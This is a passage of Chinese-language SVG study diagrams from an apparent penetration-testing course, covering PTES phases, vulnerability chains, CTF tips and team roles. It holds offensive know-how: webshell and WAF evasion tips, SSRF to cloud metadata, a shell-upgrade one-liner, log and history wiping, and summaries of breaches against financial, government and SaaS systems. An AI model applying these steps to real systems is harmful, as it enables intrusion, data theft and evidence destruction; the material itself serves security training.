  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑧ 内存马被查杀: 换哥斯拉/Behinder/菜刀加密马 / 改特征 / 注入到正常进程</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑨ DNSLog没反应: 换DNSLog平台 dnslog.cn / ceye.io / burp collaborator / 自己搭VPS Bind</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑩ SQLMap跑不出: 加--level=5 --risk=3 / --random-agent / --tamper=space2comment 绕WAF</text>
  <rect x="300" y="309" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑪ 文件上传绕不过: 图片马+%00+双后缀+竞争上传 / .htaccess / .user.ini / 解析漏洞组合</text>
  <rect x="540" y="309" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑫ SSRF打不到云元数据: 换169.254.169.254所有别名 / DNS Rebind / 短链接跳转</text>
  <rect x="60" y="382" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="414.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑬ 打了补丁的漏洞: 换变种POC / 搜索最新CVE年份2024/2025 可能有0day</text>
  <rect x="300" y="382" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="414.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑭ 反弹shell乱码: 加python -c "import pty; pty.spawn('/bin/bash')" / 换zsh/bash/sh</text>
  <rect x="540" y="382" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="414.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑮ 打完留痕: 日志必须清 / history -c 三令 / SSH记录擦除 / 最后截图报告 全程录屏</text>
</svg>

<svg width="800" height="163" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 163">
  <defs><linearGradient id="g76jyaqcr" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="163" rx="12" fill="url(#g76jyaqcr)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c2d12" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🏆 真实攻防实战 3个标准组合案例</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">案例A-金融Web系统: 入口(Struts2 RCE) → 凭据收集(数据库账号) → 横向(C段Tomcat弱口令批量) → 核心数据库导出(500万用户) → 持久化(内存马+管理员账号) 总耗时: 4小时</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">案例B-政府OA系统: 入口(Log4j2 DNS探测成功+JNDI上线) → 提权(Windows Server 2012 KiTrap0D → System) → 抓Hash(域控管理员) → PassTheHash进域控 → 全部门共享文件 总耗时: 6小时</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">案例C-企业SaaS平台: 入口(GitLab信息泄露源码+密钥) → 审计源码发现Druid未授权+SQL → 数据库导出 + SSRF到云元数据(AK/SK泄露) → 拿下对象存储全部用户上传文件 总耗时: 3小时</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gl8thva1y" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gl8thva1y)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧠 面试: 一场完整的渗透测试流程？</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 明确目标与授权书(最关键)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 被动OSINT + 主动扫描 获取全量资产指纹</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ 漏洞情报匹配 + Nuclei批量 精准挑高危利用点</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ 入口漏洞(WebRCE/弱口令/信息泄露组合) 拿下Webshell</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ 本地提权到root/system 抓取凭据</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ 隧道穿透 + 内网横向 打到核心资产(域控/DB/代码仓库)</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ 数据窃取/影响评估 + 持久化(授权范围内)</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑧ 痕迹清理 + 完整报告交付 + 复测验证</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gnzha6nf0" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gnzha6nf0)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#be123c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎯 CTF Web 综合靶场的5条得分技巧</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 先扫全站: dirsearch 扫出后台 / robots.txt / .git / .swp / 备份包</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 先出网: 任何疑似注入 先试DNSLog盲打 出网=成功一半</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ 源码泄露: .git/index + Githack / 备份.sql / www.zip 下来审计</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ 组合利用: 文件上传+解析漏洞 / SSRF+Redis / XXE+Blind OOB</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ 猜考点: 比赛一般就考最新CVE + 反序列化 + SSTI + 条件竞争 + 内网代理</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gufpalkn9" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gufpalkn9)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0369a1" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛡️ 红队 vs 蓝队 职责对比</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">红队: 模拟真实攻击者 → 找漏洞/打点/横向/持久化/拿域控 (进攻)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">蓝队: 防守+监测+响应 → 部署EDR/SIEM/HIDS/WAF/日志分析/应急响应/溯源</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">紫队: 红蓝对抗协作 → 红队打+蓝队同时看告警/调规则 共同提升防护水平</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">黄队: 工程化安全 → DevSecOps/S-SDLC/代码审计/安全开发 全流程把关注入安全</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">橙队: 威胁情报 → 0day挖掘/APT跟踪/漏洞预警/黑产监测 给红蓝提供武器弹药</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gik1rhsv8" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gik1rhsv8)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0f172a" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🗂️ PTES 7阶段详细拆解 Checklist</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 预约定: SOW签署 + NDA + IP清单确认 + 应急联系人拿到 ✓</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 信息收集: 被动OSINT(子域/邮箱/Git) + 主动扫描(端口/服务/目录) ≥10项资产 ✓</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ 威胁建模: 资产分级 + 优先级排序(P0入口/P1核心/P2外围) + 攻击路径规划 ≥3条 ✓</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ 漏洞分析: POC验证 + 风险评级(CVSS) + 绕过方案 每个高危漏洞都有手工复现截图 ✓</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ 漏洞利用: EXP脚本稳定 + 反弹shell上线 + 权限维持 + 最少痕迹 每个入口≥1种利用 ✓</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ 后渗透: 提权成功 + 凭据收集完整 + ≥2个网段横向 + 核心资产访问到 + 报告截图齐全 ✓</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ 报告交付: 7大章节齐全 + 修复建议可操作 + 复测时间约定 + 客户培训 + 正式签署验收 ✓</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gru7eh54i" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gru7eh54i)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎓 难度进度条</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">信息收集 12件套 ████████░ 80%</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">10种漏洞组合拳 ██████░░░░ 60%</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">后渗透 10动作全套 █████░░░░ 50%</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">隧道内网穿透 ███████░░ 70%</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">完整报告7大章 ██████░░░░ 60%</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">完整7阶段实战熟练度 █████░░░░ 50%</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gdgihg3jb" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gdgihg3jb)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">✅ Day44 通关自测CheckList</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">PTES 7阶段标准流程 能讲清楚每一阶段做什么</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Vulhub 12台靶机组合 至少独立打通过5台</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">10种组合拳 至少成功组合过3种 完整流程实战过</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">内网隧道 SSH/FRP/EW 三种任选 都能打通</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">写过1份完整的7大章节渗透报告 含截图复现</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">红蓝队职责 理解 能说清紫队/黄队是什么</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">避坑15条 踩过至少5条 有实战经验</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">一次完整打靶 从信息收集到横向拿核心 用时≤24小时</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g47l0h20l" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g47l0h20l)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#991b1b" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧩 常见漏洞组合利用图</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SQLi → 读配置 → 数据库账号 → UDF提权</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">XXE Blind → OOB带外 → 读源码 → 新SQLi</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SSRF → 内网Redis → 写SSH公钥 → 登录</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">文件上传 → 解析漏洞 → Webshell → 提权</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Fastjson → 内存马 → CS上线 → Mimikatz抓Hash</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Log4Shell 不出网 → 信息泄露 → 其他漏洞组合</text>
</svg>
